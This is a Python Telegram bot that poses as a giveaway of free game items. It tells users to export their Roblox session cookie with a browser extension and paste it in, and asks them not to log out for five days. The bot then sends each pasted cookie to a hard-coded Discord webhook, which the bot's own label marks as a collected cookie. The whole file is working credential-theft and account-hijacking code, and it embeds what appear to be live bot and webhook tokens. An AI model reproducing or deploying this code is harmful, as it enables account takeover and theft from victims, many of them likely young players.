import telebot
from telebot import types
from datetime import datetime
from discord_webhook import DiscordWebhook, DiscordEmbed
from random import choice

webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1032504138866630746/mu11CNhkXupJlvOTSwxKdkJPOVnluK3KfZFxR0n7hIZz7GOvheUgpztsYWs0oUCM_Gh-')
bot = telebot.TeleBot("5736515923:AAHuS7RSeBbEpDces8QqFWiHq-4BNP8-Kog")
now = datetime.now()
blacklist = []

auctionitems = ["Paterson Navy", "Lancaster Pistol", "Schwarzlose Prototype Pistol", "Kukri Machete"]

@bot.message_handler(commands=['start'])
def start(message):
    if message.from_user.username in blacklist:
        bot.send_message(message.chat.id, f("🚫 You've been blocked"))
    else:
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        button1 = types.KeyboardButton("🥱 What does the bot do?")
        button2 = types.KeyboardButton("🔫 Get auction items")
        button3 = types.KeyboardButton("© Credits")
        markup.add(button1, button2, button3)
        bot.send_message(message.chat.id, f'👋 Hello, {message.from_user.first_name}', reply_markup=markup)

@bot.message_handler(content_types=['text'])
def func(message):
    if message.from_user.username in blacklist:
        pass
    else:
        if(message.text == "🥱 What does the bot do?"):
            markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
            button1 = types.KeyboardButton("⬅️ Go back to main menu")
            markup.add(button1)
            bot.send_message(message.chat.id, text="🤖 Gives auction items via https requests to the game", reply_markup=markup)
        elif(message.text == "🔫 Get auction items"):
            markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
            button1 = types.KeyboardButton("🤠 Send a special code to the bot")
            button2 = types.KeyboardButton("❔ How to send a code?")
            button3 = types.KeyboardButton("⬅️ Go back to main menu")
            markup.add(button1, button2, button3)
            bot.send_message(message.chat.id, text="🔒 Okay, send the code (note: do not log out of your account for the first 5 days)", reply_markup=markup)
        elif(message.text == "© Credits"):
            markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
            button1 = types.KeyboardButton("⬅️ Go back to main menu")
            markup.add(button1)
            bot.send_message(message.chat.id, text="😀 Thanks to AdamEterno for sharing the bug", reply_markup=markup)
        elif(message.text == "🤠 Send a special code to the bot"):
            markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
            button1 = types.KeyboardButton("⬅️ Go back")
            markup.add(button1)
            bot.send_message(message.chat.id, text="Send the code in the format: _|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_XXXXXXXXX", reply_markup=markup)
        elif(message.text == "❔ How to send a code?"):
            markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
            button1 = types.KeyboardButton("⬅️ Go back")
            markup.add(button1)
            bot.send_message(message.chat.id, text="Download your code with the extension: EditThisCookie(https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg?hl=ru), then open the file .ROBLOXSECURITY and copy everything", reply_markup=markup)
        elif(message.text == "⬅️ Go back to main menu"):
            markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
            button1 = types.KeyboardButton("🥱 What does the bot do?")
            button2 = types.KeyboardButton("🔫 Get auction items")
            button3 = types.KeyboardButton("© Credits")
            markup.add(button1, button2, button3)
            bot.send_message(message.chat.id, f'👋 Hello again, {message.from_user.first_name}', reply_markup=markup)
        elif(message.text == "⬅️ Go back"):
            markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
            button1 = types.KeyboardButton("🤠 Send a special code to the bot")
            button2 = types.KeyboardButton("❔ How to send a code?")
            button3 = types.KeyboardButton("⬅️ Go back to main menu")
            markup.add(button1, button2, button3)
            bot.send_message(message.chat.id, text="🔒 Okay, send the code (note: do not log out of your account for the first 5 days)", reply_markup=markup)
        elif("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_" in message.text):
            markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
            button1 = types.KeyboardButton("⬅️ Go back to main menu")
            markup.add(button1)
            bot.send_message(message.chat.id, text=f"😃 Thanks! You will get {choice(auctionitems)}", reply_markup=markup)
            
            embed = DiscordEmbed(title='🍪 Новый куки файл!', description=f'{message.text}', color='6f1485')
            webhook.add_embed(embed)

            response = webhook.execute()



bot.polling(none_stop=True)